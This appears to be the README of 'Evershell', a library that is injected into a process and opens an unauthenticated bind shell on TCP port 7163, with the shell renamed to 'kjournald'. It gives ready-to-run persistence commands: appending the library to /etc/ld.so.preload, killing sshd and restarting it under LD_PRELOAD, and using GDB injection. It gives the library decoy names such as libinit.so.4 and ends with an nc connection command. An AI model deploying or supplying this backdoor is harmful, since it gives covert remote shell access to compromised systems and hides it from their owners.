Evershell
=========
Injected as a library into another process, evershell listens on a TCP port
(7163 by default) and every time it gets a connection, double-forks a shell
and sets the shell's stdio to the connection.  The shell's name (i.e.
`argv[0]`) is set to `kjournald` by default.

For legal use only.

Configuration
-------------
Almost none.  The listen port and the shell's name are configured with the
preprocessor macros `PORT` and `SHELLNAME`, respectively, near the top of the
file.  The defaults will probably work fine in most cases.

Installation
------------
How to get a library loaded into a "normal" process is can get very OS-specific
and on Linux, can even be distro-specific.  Below are a few ways to do it.
Pull requests with more are welcome.

### `/etc/ld.so.preload`
On platforms which support it, libraries listed in `/etc/ld.so.preload` will
be loaded into all processes.  On Linux this means systemd because obviously
it's a good idea to have a dynamically-linked, injectable systemd.

Example, assuming evershell has been put in `/usr/lib/libinit.so.4`:
```bash
echo /usr/lib/libinit.so.4 >> /etc/ld.so.preload
```

### Via GDB
See https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html

### Via `LD_PRELOAD`
Set the `LD_PRELOAD` environment variable to the path to the library and start
a normal, long-running process.

Example, assuming evershell is called `libmath.so.4`:
```bash
pkill -9 sshd && LD_PRELOAD=libmath.so.4 /usr/sbin/sshd

Connection
----------
For the most part, it should be as simple as
```bash
nc -v <TARGET> 7163
```
